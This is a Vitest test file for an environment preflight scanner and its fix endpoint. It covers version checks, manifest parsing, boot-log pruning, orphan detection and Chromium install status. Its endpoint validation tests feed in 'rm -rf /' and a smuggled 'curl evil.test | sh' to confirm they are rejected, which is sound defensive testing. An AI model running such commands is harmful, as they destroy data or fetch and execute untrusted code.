import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  utimesSync,
  writeFileSync,
} from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import {
  type PreflightPaths,
  applyPreflightFix,
  compareVersions,
  firstBlocking,
  nodeFloor,
  orphanWorktreeDirs,
  readManifestFile,
  runPreflight,
  staleBootLogs,
  versionParts,
} from '../src/env/preflight';
import type { EnvManifest } from '../src/env/types';
import { POST as postFix } from '../src/routes/env-preflight/fix/route';

// ─── Fixture scaffolding ────────────────────────────────────────────────────

let tmp: string;

/** Everything the scan touches, redirected into a throwaway tree. */
function fakePaths(overrides: Partial<PreflightPaths> = {}): PreflightPaths {
  return {
    appDir: path.join(tmp, 'app'),
    repoRoot: tmp,
    envsDir: path.join(tmp, '.envs'),
    manifestPath: path.join(tmp, 'app', 'data', 'ephemeral-envs.json'),
    ledgerPath: path.join(tmp, 'app', 'data', 'quota-ledger.json'),
    browsersDir: path.join(tmp, 'ms-playwright'),
    ...overrides,
  };
}

function env(over: Partial<EnvManifest> = {}): EnvManifest {
  return {
    id: 'env_1',
    taskId: null,
    productId: null,
    worktreePath: path.join(tmp, '.envs', 'env_1'),
    branch: 'env/env_1',
    baseCommit: 'abc123',
    port: null,
    url: null,
    pid: null,
    status: 'ready',
    timings: {
      worktreeMs: null,
      installMs: null,
      seedMs: null,
      bootMs: null,
      healthMs: null,
      totalMs: null,
    },
    createdAt: '2026-08-01T00:00:00.000Z',
    updatedAt: '2026-08-01T00:00:00.000Z',
    error: null,
    seedSummary: null,
    ...over,
  };
}

function writeManifest(paths: PreflightPaths, body: string): void {
  mkdirSync(path.dirname(paths.manifestPath), { recursive: true });
  writeFileSync(paths.manifestPath, body, 'utf-8');
}

beforeEach(() => {
  tmp = mkdtempSync(path.join(os.tmpdir(), 'preflight-'));
  mkdirSync(path.join(tmp, 'app'), { recursive: true });
});

afterEach(() => {
  rmSync(tmp, { recursive: true, force: true });
});

// ─── Version comparison ─────────────────────────────────────────────────────

describe('version comparison', () => {
  it('extracts leading numeric components', () => {
    expect(versionParts('v22.15.1')).toEqual([22, 15, 1]);
    expect(versionParts('git version 2.50.1 (Apple Git-155)')).toEqual([2, 50, 1]);
    expect(versionParts('>=20')).toEqual([20]);
    expect(versionParts('nonsense')).toEqual([]);
  });

  it('compares only as many components as the floor supplies', () => {
    expect(compareVersions('v22.1.0', [20])).toBe(1);
    expect(compareVersions('v18.20.0', [20])).toBe(-1);
    expect(compareVersions('v20.0.0', [20])).toBe(0);
    expect(compareVersions('git version 2.29.9', [2, 30])).toBe(-1);
    expect(compareVersions('git version 2.30.0', [2, 30])).toBe(0);
    expect(compareVersions('git version 2.50.1', [2, 30])).toBe(1);
  });

  it('treats a missing version as below any floor', () => {
    expect(compareVersions('', [20])).toBe(-1);
  });
});

describe('nodeFloor', () => {
  it('reads package.json engines.node', () => {
    writeFileSync(
      path.join(tmp, 'app', 'package.json'),
      JSON.stringify({ engines: { node: '>=22.1.0' } }),
    );
    expect(nodeFloor(path.join(tmp, 'app'))).toBe(22);
  });

  it('falls back to 20 with no engines field or no package.json', () => {
    expect(nodeFloor(path.join(tmp, 'app'))).toBe(20);
    writeFileSync(path.join(tmp, 'app', 'package.json'), JSON.stringify({ name: 'x' }));
    expect(nodeFloor(path.join(tmp, 'app'))).toBe(20);
  });
});

describe('node-version check', () => {
  it('fails as blocking below the floor', () => {
    const paths = fakePaths();
    const check = runPreflight({ paths, nodeVersion: 'v18.20.0' }).checks.find(
      (c) => c.id === 'node-version',
    )!;
    expect(check.status).toBe('fail');
    expect(check.severity).toBe('blocking');
    expect(check.message).toContain('below the required Node 20');
    expect(firstBlocking(runPreflight({ paths, nodeVersion: 'v18.20.0' }))?.id).toBe(
      'node-version',
    );
  });

  it('passes at or above the floor', () => {
    const check = runPreflight({ paths: fakePaths(), nodeVersion: 'v20.0.0' }).checks.find(
      (c) => c.id === 'node-version',
    )!;
    expect(check.status).toBe('pass');
  });
});

// ─── Manifest ───────────────────────────────────────────────────────────────

describe('manifest parsing', () => {
  it('treats a missing manifest as empty, not corrupt', () => {
    expect(readManifestFile(path.join(tmp, 'nope.json'))).toEqual([]);
  });

  it('returns null for unparseable and for a missing envs array', () => {
    const paths = fakePaths();
    writeManifest(paths, '{ this is not json');
    expect(readManifestFile(paths.manifestPath)).toBeNull();
    writeManifest(paths, JSON.stringify({ notEnvs: [] }));
    expect(readManifestFile(paths.manifestPath)).toBeNull();
  });
});

describe('corrupt manifest check', () => {
  it('fails blocking and carries the reset-env-manifest fix', () => {
    const paths = fakePaths();
    writeManifest(paths, '{{{ truncated');
    const check = runPreflight({ paths }).checks.find((c) => c.id === 'env-manifest')!;
    expect(check.status).toBe('fail');
    expect(check.severity).toBe('blocking');
    expect(check.fix).toEqual({ kind: 'reset-env-manifest', label: 'Back up and reset manifest' });
  });

  it('passes with a healthy manifest and offers no fix', () => {
    const paths = fakePaths();
    writeManifest(paths, JSON.stringify({ envs: [env()] }));
    const check = runPreflight({ paths }).checks.find((c) => c.id === 'env-manifest')!;
    expect(check.status).toBe('pass');
    expect(check.message).toContain('1 env recorded');
    expect(check.fix).toBeUndefined();
  });
});

// ─── Boot logs ──────────────────────────────────────────────────────────────

describe('staleBootLogs', () => {
  const NOW = Date.parse('2026-08-10T12:00:00.000Z');

  function log(paths: PreflightPaths, name: string, ageDays: number): string {
    mkdirSync(paths.envsDir, { recursive: true });
    const file = path.join(paths.envsDir, name);
    writeFileSync(file, 'boot output', 'utf-8');
    const seconds = (NOW - ageDays * 86_400_000) / 1000;
    utimesSync(file, seconds, seconds);
    return file;
  }

  it('counts only logs older than the cutoff', () => {
    const paths = fakePaths();
    const old = log(paths, 'env_old.boot.log', 30);
    log(paths, 'env_new.boot.log', 1);
    log(paths, 'env_edge.boot.log', 6.9);
    expect(staleBootLogs(paths.envsDir, NOW)).toEqual([old]);
  });

  it('ignores non-log entries and a missing dir', () => {
    const paths = fakePaths();
    log(paths, 'old.boot.log', 30);
    const notALog = path.join(paths.envsDir, 'notes.txt');
    writeFileSync(notALog, 'x', 'utf-8');
    utimesSync(notALog, 0, 0);
    expect(staleBootLogs(paths.envsDir, NOW)).toHaveLength(1);
    expect(staleBootLogs(path.join(tmp, 'absent'), NOW)).toEqual([]);
  });

  it('surfaces as a warning with the prune fix, and the fix deletes them', () => {
    const paths = fakePaths();
    log(paths, 'a.boot.log', 30);
    log(paths, 'b.boot.log', 8);
    log(paths, 'fresh.boot.log', 1);

    const before = runPreflight({ paths, now: NOW }).checks.find((c) => c.id === 'boot-logs')!;
    expect(before.status).toBe('warning');
    expect(before.fix?.kind).toBe('prune-boot-logs');

    const { started, result } = applyPreflightFix('prune-boot-logs', { paths, now: NOW });
    expect(started).toBe(false);
    expect(result.checks.find((c) => c.id === 'boot-logs')!.status).toBe('pass');
    expect(readdirSync(paths.envsDir)).toEqual(['fresh.boot.log']);
  });
});

// ─── Orphans ────────────────────────────────────────────────────────────────

describe('orphan detection', () => {
  it('counts .envs/ directories with no manifest entry', () => {
    const paths = fakePaths();
    mkdirSync(path.join(paths.envsDir, 'env_1'), { recursive: true });
    mkdirSync(path.join(paths.envsDir, 'env_stray'), { recursive: true });
    writeFileSync(path.join(paths.envsDir, 'env_1.boot.log'), 'x', 'utf-8');
    expect(orphanWorktreeDirs(paths.envsDir, [env({ id: 'env_1' })])).toEqual([
      path.join(paths.envsDir, 'env_stray'),
    ]);
  });

  it('reports a ready env with a dead pid and offers reconcile-orphans', () => {
    const paths = fakePaths();
    // PID 2^22 is above every platform's pid_max default, so it cannot be alive.
    writeManifest(paths, JSON.stringify({ envs: [env({ status: 'ready', pid: 4_194_304 })] }));
    const check = runPreflight({ paths }).checks.find((c) => c.id === 'orphan-envs')!;
    expect(check.status).toBe('warning');
    expect(check.fix?.kind).toBe('reconcile-orphans');
    expect(check.message).toContain('1 env(s) claim to be up with a dead process');
    expect(check.details).toContain('env_1');
  });

  it('passes when every env is torn down and .envs/ is tidy', () => {
    const paths = fakePaths();
    writeManifest(paths, JSON.stringify({ envs: [env({ status: 'torn-down' })] }));
    const check = runPreflight({ paths }).checks.find((c) => c.id === 'orphan-envs')!;
    expect(check.status).toBe('pass');
    expect(check.fix).toBeUndefined();
  });

  it('routes the reconcile fix to reconcileOrphans and re-scans', () => {
    const paths = fakePaths();
    writeManifest(paths, JSON.stringify({ envs: [env({ status: 'ready', pid: 4_194_304 })] }));

    // Injected so the test never writes the real data/ephemeral-envs.json.
    const reconcile = vi.fn(() => {
      writeManifest(paths, JSON.stringify({ envs: [env({ status: 'failed', pid: null })] }));
    });

    const { started, result } = applyPreflightFix('reconcile-orphans', { paths, reconcile });
    expect(reconcile).toHaveBeenCalledOnce();
    expect(started).toBe(false);
    expect(result.checks.find((c) => c.id === 'orphan-envs')!.status).toBe('pass');
  });
});

// ─── reset-env-manifest ─────────────────────────────────────────────────────

describe('reset-env-manifest fix', () => {
  it('backs up a corrupt manifest and writes an empty one', () => {
    const paths = fakePaths();
    writeManifest(paths, '{ corrupt');

    const { result } = applyPreflightFix('reset-env-manifest', { paths });
    expect(result.checks.find((c) => c.id === 'env-manifest')!.status).toBe('pass');
    expect(JSON.parse(readFileSync(paths.manifestPath, 'utf-8'))).toEqual({ envs: [] });

    const backups = readdirSync(path.dirname(paths.manifestPath)).filter((f) =>
      f.includes('.bak-'),
    );
    expect(backups).toHaveLength(1);
    expect(readFileSync(path.join(path.dirname(paths.manifestPath), backups[0]), 'utf-8')).toBe(
      '{ corrupt',
    );
  });

  it('refuses to discard a healthy manifest', () => {
    const paths = fakePaths();
    const healthy = JSON.stringify({ envs: [env()] });
    writeManifest(paths, healthy);

    applyPreflightFix('reset-env-manifest', { paths });
    expect(readFileSync(paths.manifestPath, 'utf-8')).toBe(healthy);
    expect(
      readdirSync(path.dirname(paths.manifestPath)).filter((f) => f.includes('.bak-')),
    ).toEqual([]);
  });
});

// ─── Chromium ───────────────────────────────────────────────────────────────

describe('chromium check', () => {
  const NOW = Date.parse('2026-08-10T12:00:00.000Z');

  it('passes when a chromium build directory exists', () => {
    const paths = fakePaths();
    mkdirSync(path.join(paths.browsersDir, 'chromium-1234'), { recursive: true });
    const check = runPreflight({ paths, now: NOW }).checks.find(
      (c) => c.id === 'playwright-chromium',
    )!;
    expect(check.status).toBe('pass');
    expect(check.fix).toBeUndefined();
  });

  it('does not accept headless_shell alone as chromium', () => {
    const paths = fakePaths();
    mkdirSync(path.join(paths.browsersDir, 'chromium_headless_shell-1234'), { recursive: true });
    expect(
      runPreflight({ paths, now: NOW }).checks.find((c) => c.id === 'playwright-chromium')?.fix
        ?.kind,
    ).toBe('install-chromium');
  });

  it('reports installing… while a recent install log is present', () => {
    const paths = fakePaths();
    mkdirSync(paths.envsDir, { recursive: true });
    const log = path.join(paths.envsDir, 'chromium-install.log');
    writeFileSync(log, 'started', 'utf-8');
    const seconds = (NOW - 60_000) / 1000;
    utimesSync(log, seconds, seconds);

    const check = runPreflight({ paths, now: NOW }).checks.find(
      (c) => c.id === 'playwright-chromium',
    )!;
    expect(check.status).toBe('warning');
    expect(check.message).toContain('Installing…');
    // No fix button while one is in flight — clicking again would just relaunch.
    expect(check.fix).toBeUndefined();
  });

  it('offers the fix again once the install window has lapsed', () => {
    const paths = fakePaths();
    mkdirSync(paths.envsDir, { recursive: true });
    const log = path.join(paths.envsDir, 'chromium-install.log');
    writeFileSync(log, 'started', 'utf-8');
    const seconds = (NOW - 3 * 3_600_000) / 1000;
    utimesSync(log, seconds, seconds);
    expect(
      runPreflight({ paths, now: NOW }).checks.find((c) => c.id === 'playwright-chromium')?.fix
        ?.kind,
    ).toBe('install-chromium');
  });
});

// ─── Quota ledger ───────────────────────────────────────────────────────────

describe('quota ledger check', () => {
  it('warns when the ledger is unparseable', () => {
    const paths = fakePaths();
    mkdirSync(path.dirname(paths.ledgerPath), { recursive: true });
    writeFileSync(paths.ledgerPath, 'not json', 'utf-8');
    const check = runPreflight({ paths }).checks.find((c) => c.id === 'quota-ledger')!;
    expect(check.status).toBe('warning');
    expect(check.message).toContain('over-spend');
  });

  it('passes when absent or valid', () => {
    const paths = fakePaths();
    expect(runPreflight({ paths }).checks.find((c) => c.id === 'quota-ledger')?.status).toBe(
      'pass',
    );
    mkdirSync(path.dirname(paths.ledgerPath), { recursive: true });
    writeFileSync(paths.ledgerPath, JSON.stringify({ spawns: [], backends: {} }), 'utf-8');
    expect(runPreflight({ paths }).checks.find((c) => c.id === 'quota-ledger')?.status).toBe(
      'pass',
    );
  });
});

// ─── Fix endpoint: the closed set is the whole instruction set ──────────────

describe('POST /api/env-preflight/fix validation', () => {
  const post = (body: unknown) =>
    postFix(
      new Request('http://localhost/api/env-preflight/fix', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
      }),
    );

  it('rejects a kind outside the union', async () => {
    for (const kind of ['rm -rf /', 'reconcile_orphans', '', 'install-firefox', 42, null]) {
      const res = await post({ kind });
      expect(res.status, `kind=${JSON.stringify(kind)}`).toBe(400);
      expect(((await res.json()) as { error: string }).error).toBe('Validation failed');
    }
  });

  it('rejects a missing kind, extra fields, and non-JSON bodies', async () => {
    expect((await post({})).status).toBe(400);
    // .strict() — no smuggling a command alongside a valid kind.
    expect((await post({ kind: 'prune-boot-logs', command: 'curl evil.test | sh' })).status).toBe(
      400,
    );

    const bad = await postFix(
      new Request('http://localhost/api/env-preflight/fix', { method: 'POST', body: 'not json' }),
    );
    expect(bad.status).toBe(400);
    expect(((await bad.json()) as { error: string }).error).toBe('Invalid JSON body');
  });
});

// ─── Boot recipe ────────────────────────────────────────────────────────────

describe('boot recipe check', () => {
  const bootCheck = (paths: PreflightPaths) =>
    runPreflight({ paths }).checks.find((c) => c.id === 'boot-recipe')!;

  it('warns — never blocks — when the repo has no .ligma/boot.json', () => {
    const check = bootCheck(fakePaths({ repoRoot: path.join(tmp, 'no-ligma') }));
    expect(check.status).toBe('warning');
    expect(check.severity).toBe('warning');
    expect(check.message).toContain('journey runs');
  });

  it('fails a malformed recipe, naming the file', () => {
    const repo = path.join(tmp, 'broken-ligma');
    mkdirSync(path.join(repo, '.ligma'), { recursive: true });
    writeFileSync(
      path.join(repo, '.ligma', 'boot.json'),
      JSON.stringify({ dev: 'npm start' }),
      'utf-8',
    );
    const check = bootCheck(fakePaths({ repoRoot: repo }));
    expect(check.status).toBe('fail');
    expect(check.details).toContain('boot.json');
  });

  it("passes ligma's own hand-written recipe and shows what it will run", () => {
    const check = bootCheck(fakePaths({ repoRoot: path.resolve(__dirname, '../../..') }));
    expect(check.status).toBe('pass');
    expect(check.message).toContain('health marker');
  });

  it('passes an artifact recipe without claiming it has a server (H5)', () => {
    const repo = path.join(tmp, 'artifact-ligma');
    mkdirSync(path.join(repo, '.ligma'), { recursive: true });
    writeFileSync(
      path.join(repo, '.ligma', 'boot.json'),
      JSON.stringify({ dev: null, artifacts: ['paper.md', 'figures/*.png'], check: ['pytest'] }),
      'utf-8',
    );
    const check = bootCheck(fakePaths({ repoRoot: repo }));
    expect(check.status).toBe('pass');
    expect(check.message).toContain('2 declared artifact(s)');
    expect(check.message).toContain('check "pytest"');
    // The words a served product's check uses must not appear for one that is not.
    expect(check.message).not.toContain('health marker');
  });
});

// ─── Shape ──────────────────────────────────────────────────────────────────

describe('scan shape', () => {
  it('returns every check exactly once, with only closed-set fix kinds', () => {
    const result = runPreflight({ paths: fakePaths() });
    const ids = result.checks.map((c) => c.id);
    expect(new Set(ids).size).toBe(ids.length);
    expect(ids).toEqual([
      'node-version',
      'pnpm',
      'git-worktree',
      'envs-root',
      'env-manifest',
      'orphan-envs',
      'boot-logs',
      'playwright-chromium',
      'boot-recipe',
      'quota-ledger',
    ]);
    for (const check of result.checks) {
      if (!check.fix) continue;
      expect([
        'reconcile-orphans',
        'prune-boot-logs',
        'reset-env-manifest',
        'install-chromium',
      ]).toContain(check.fix.kind);
    }
  });
});
